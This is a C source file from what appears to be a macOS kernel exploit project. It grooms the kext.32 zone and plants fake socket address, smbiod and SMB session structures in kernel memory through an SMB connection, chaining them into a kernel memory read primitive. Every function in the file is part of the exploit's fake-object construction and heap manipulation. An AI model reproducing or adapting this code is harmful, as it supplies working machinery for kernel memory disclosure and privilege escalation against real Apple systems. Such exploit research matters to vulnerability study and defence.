//
//  kmem_read_session.c
//  xe_kmem
//
//  Created by admin on 2/22/22.
//

#include <assert.h>
#include <stdio.h>
#include <limits.h>

#include <arpa/inet.h>

#include <xe/util/assert.h>
#include <xe/util/log.h>

#include "memory/allocator_nrnw.h"
#include "memory/zkext_alloc_small.h"
#include "smb/client.h"
#include "smb/params.h"

#include "kmem_read_session.h"

#define NUM_KEXT_32_FRAGMENTED_PAGES 1024


struct kmem_read_session {
    struct kmem_zkext_alloc_small_entry sock_addr_alloc;
    struct kmem_zkext_alloc_small_entry sock_addr_entry_alloc;
    struct kmem_zkext_alloc_small_entry iod_alloc;
    struct kmem_zkext_alloc_small_entry session_alloc;
    
    uintptr_t sock_addr_addr;
    uintptr_t sock_addr_entry_addr;
    uintptr_t iod_addr;
    uintptr_t nic_entry_addr;
    uintptr_t session_addr;
};


void kmem_read_session_fragment_kext_32(const struct sockaddr_in* smb_addr, kmem_allocator_nrnw_t nrnw_allocator) {
    kmem_allocator_nrnw_t gap_allocator = kmem_allocator_nrnw_create(smb_addr);
    for (int i=0; i<NUM_KEXT_32_FRAGMENTED_PAGES; i++) {
        kmem_allocator_nrnw_allocate(nrnw_allocator, 32, 2);
        kmem_allocator_nrnw_allocate(gap_allocator, 32, (XE_PAGE_SIZE / 32) - 2);
    }
    kmem_allocator_nrnw_destroy(&gap_allocator);
}


void kmem_read_session_build_sock_addr(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
    xe_assert_cond(session->sock_addr_addr, ==, 0);
    
    struct kmem_zkext_alloc_small_entry entry = kmem_zkext_alloc_small(smb_addr, 224, AF_INET, (char*)&kmem_read_session_NIC_SADDR, sizeof(kmem_read_session_NIC_SADDR));
    uintptr_t fake_sock_addr_addr = entry.address + 8;
    
    session->sock_addr_addr = fake_sock_addr_addr;
    session->sock_addr_alloc = entry;
    xe_log_debug("allocated fake_sock_addr at: %p", (void*)fake_sock_addr_addr);
}


void kmem_read_session_build_sock_addr_entry(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
    xe_assert(session->sock_addr_addr != 0);
    xe_assert_cond(session->sock_addr_entry_addr, ==, 0);
    
    struct sock_addr_entry saddr_entry;
    bzero(&saddr_entry, sizeof(saddr_entry));
    saddr_entry.addr = (struct sockaddr*)session->sock_addr_addr;
    
    struct kmem_zkext_alloc_small_entry entry = kmem_zkext_alloc_small(smb_addr, 160, AF_INET, (char*)&saddr_entry, sizeof(saddr_entry));
    uintptr_t fake_sock_addr_entry_addr = entry.address + 8;
    
    session->sock_addr_entry_alloc = entry;
    session->sock_addr_entry_addr = fake_sock_addr_entry_addr;
    xe_log_debug("allocated fake_sock_addr_entry at: %p", (void*)fake_sock_addr_entry_addr);
}


void kmem_read_session_build_iod(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
    xe_assert(session->sock_addr_entry_addr != 0);
    xe_assert_cond(session->iod_addr, ==, 0);
    
    struct smbiod fake_iod;
    bzero(&fake_iod, sizeof(fake_iod));
    
    static_assert(offsetof(struct smbiod, iod_tdata) % 8 == 0, "");
    size_t fake_iod_start = offsetof(struct smbiod, iod_tdata);
    size_t fake_iod_end = fake_iod_start + 248;
    
    assert(fake_iod_start <= 248);
    assert(offsetof(struct smbiod, iod_gss.gss_spn) >= fake_iod_start);
    assert(offsetof(struct smbiod, iod_gss.gss_spn) + offsetof(struct complete_nic_info_entry, addr_list.tqh_first) + 8 < fake_iod_end);
    struct complete_nic_info_entry* fake_nic_entry = (struct complete_nic_info_entry*)((char*)&fake_iod + offsetof(struct smbiod, iod_gss.gss_spn));
    fake_nic_entry->nic_index = kmem_read_session_NIC_INDEX;
    fake_nic_entry->addr_list.tqh_first = (struct sock_addr_entry*)session->sock_addr_entry_addr;
    
    assert(offsetof(struct smbiod, iod_ref_cnt) >= fake_iod_start);
    assert(offsetof(struct smbiod, iod_ref_cnt) + sizeof(uint32_t) < fake_iod_end);
    fake_iod.iod_ref_cnt = 1;
    
    // mark area covered by socket address
    *((uintptr_t*)((char*)&fake_iod + fake_iod_start - 8)) = 0xabcdef1234567890;
    
    assert(offsetof(struct smbiod, iod_flags) < fake_iod_start);
    assert(offsetof(struct smbiod, iod_session) < fake_iod_start);
    struct smbiod* prev_fake_iod = (struct smbiod*)((char*)&fake_iod + 256);
    assert(prev_fake_iod->iod_session == 0);
    assert(prev_fake_iod->iod_flags == 0);
    prev_fake_iod->iod_flags |= SMBIOD_RUNNING;
    
    struct kmem_zkext_alloc_small_entry fake_iod_alloc = kmem_zkext_alloc_small(smb_addr, 255, AF_INET, (char*)&fake_iod + fake_iod_start, 255 - 8);
    uintptr_t fake_iod_addr = fake_iod_alloc.address + 8 - fake_iod_start;
    
    printf("addr_list: %p\n", fake_nic_entry->addr_list.tqh_first);
    xe_log_debug_hexdump(fake_nic_entry, sizeof(*fake_nic_entry), "fake nic entry: ");
    
    session->iod_alloc = fake_iod_alloc;
    session->iod_addr = fake_iod_addr;
    session->nic_entry_addr = fake_iod_addr + offsetof(struct smbiod, iod_gss.gss_spn);
    xe_log_debug("allocated fake_iod at: %p", (void*)fake_iod_addr);
    xe_log_debug("memory for fake_iod allocated at: %p", (void*)fake_iod_alloc.address);
    xe_log_debug("using fake_nic_entry addr: %p", (void*)session->nic_entry_addr);
}


void kmem_read_session_build_session(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
    xe_assert(session->iod_addr != 0);
    xe_assert(session->nic_entry_addr != 0);
    xe_assert_cond(session->session_addr, ==, 0);
    
    char kmem_read_session[256];
    bzero(kmem_read_session, sizeof(kmem_read_session));
    uintptr_t base = TYPE_SMB_SESSION_MEM_IOD_TAILQ_LOCK_OFFSET;
    
    *((uint64_t*)kmem_read_session + 1) = 0x22000000;
    *((uint64_t*)(kmem_read_session + TYPE_SMB_SESSION_MEM_IOD_TAILQ_HEAD_OFFSET - base)) = session->iod_addr;
    
    struct session_network_interface_info* fake_nic_info = (struct session_network_interface_info*)(kmem_read_session + TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET - base);
    fake_nic_info->interface_table_lck.opaque[1] = 0x22000000;
    fake_nic_info->client_nic_count = 1;
    fake_nic_info->client_nic_info_list.tqh_first = (struct complete_nic_info_entry*)session->nic_entry_addr;
    
    static_assert((TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET + offsetof(struct session_network_interface_info, client_if_blacklist_len) - TYPE_SMB_SESSION_MEM_IOD_TAILQ_LOCK_OFFSET) <= 216, "");
    
    struct kmem_zkext_alloc_small_entry kmem_read_session_alloc = kmem_zkext_alloc_small(smb_addr, 224, AF_INET, kmem_read_session, 218);
    uintptr_t kmem_read_session_addr = kmem_read_session_alloc.address + 8 - base;
    
    session->session_alloc = kmem_read_session_alloc;
    session->session_addr = kmem_read_session_addr;
    xe_log_debug("allocated kmem_read_session at: %p", (void*)kmem_read_session_addr);
    xe_log_debug("memory for kmem_read_session allocated at: %p", (void*)kmem_read_session_alloc.address);
}


kmem_read_session_t kmem_read_session_create(const struct sockaddr_in* smb_addr) {
    kmem_allocator_nrnw_t nrnw_allocator = kmem_allocator_nrnw_create(smb_addr);
    kmem_read_session_fragment_kext_32(smb_addr, nrnw_allocator);
    
    kmem_read_session_t kmem_read_session = malloc(sizeof(struct kmem_read_session));
    bzero(kmem_read_session, sizeof(struct kmem_read_session));
    
    kmem_read_session_build_sock_addr(kmem_read_session, smb_addr);
    kmem_read_session_build_sock_addr_entry(kmem_read_session, smb_addr);
    kmem_read_session_build_iod(kmem_read_session, smb_addr);
    kmem_allocator_nrnw_allocate(nrnw_allocator, 32, XE_PAGE_SIZE / 32 * 8);
    kmem_read_session_build_session(kmem_read_session, smb_addr);
    
    kmem_allocator_nrnw_destroy(&nrnw_allocator);
    return kmem_read_session;
}

uintptr_t kmem_read_session_get_addr(kmem_read_session_t session) {
    xe_assert(session->session_addr != 0);
    return session->session_addr;
}

void kmem_read_session_destroy(kmem_read_session_t* session_p) {
    kmem_read_session_t session = *session_p;
    kmem_allocator_prpw_destroy(&session->sock_addr_alloc.element_allocator);
    kmem_allocator_prpw_destroy(&session->sock_addr_entry_alloc.element_allocator);
    kmem_allocator_prpw_destroy(&session->iod_alloc.element_allocator);
    kmem_allocator_prpw_destroy(&session->session_alloc.element_allocator);
    free(session);
    *session_p = NULL;
}
